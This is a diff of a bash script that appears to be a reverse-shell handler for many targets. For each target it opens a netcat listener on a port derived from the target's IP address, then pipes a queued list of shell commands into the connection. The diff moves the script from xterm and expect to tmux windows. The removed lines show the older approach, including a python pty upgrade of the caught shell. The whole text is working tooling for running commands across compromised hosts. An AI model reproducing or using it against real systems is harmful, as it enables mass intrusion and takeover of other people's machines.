@@ -17,6 +17,12 @@ if [ "$#" -eq 0 ]; then
     exit 1
 fi
 
+# Ensure we're inside a tmux session
+if [ -z "$TMUX" ]; then
+    echo "Not inside tmux. Starting a new tmux session..."
+    exec tmux new-session -s main "$0" "$@"
+fi
+
 handle_target() {
     local TARGET="$1"
     shift
@@ -26,36 +32,21 @@ handle_target() {
     FOURTH=$(echo "$TARGET" | cut -d'.' -f4)
     PORT=$(( BASE_PORT + SECOND*100 + FOURTH ))
 
-    echo "[$TARGET] Connecting on port $PORT"
-
-    # Build the expect send blocks dynamically
-    CMD_BLOCK=""
+    local CMD_STR=""
     for cmd in "${CMDS[@]}"; do
-        CMD_BLOCK+="
-expect -re \"\[#\$\] \"
-send \"$cmd\r\""
+        CMD_STR+="echo '>>> ${cmd}'; ${cmd}; "
     done
 
-    xterm -title "$TARGET:$PORT" -e bash -c "
-expect << 'EOF'
-spawn nc -lvnp $PORT
-expect -re \"\[#\$\] \"
-send \"python3 -c 'import pty;pty.spawn(\\\"/bin/bash\\\")'\r\"
-$CMD_BLOCK
-expect -re \"\[#\$\] \"
-interact
-EOF
-" &
+    tmux new-window -n "$TARGET" "echo '${CMD_STR}' | nc -lvnp $PORT; read -p 'Done. Press enter to close.'"
 }
 
-# Job pool: process targets MAX_PARALLEL at a time
 job_count=0
 for TARGET in "${TARGETS[@]}"; do
     handle_target "$TARGET" "$@" &
     (( job_count++ ))
 
     if (( job_count >= MAX_PARALLEL )); then
-        wait -n 2>/dev/null || wait   # wait for any one job to finish
+        wait -n 2>/dev/null || wait
         (( job_count-- ))
     fi
 done
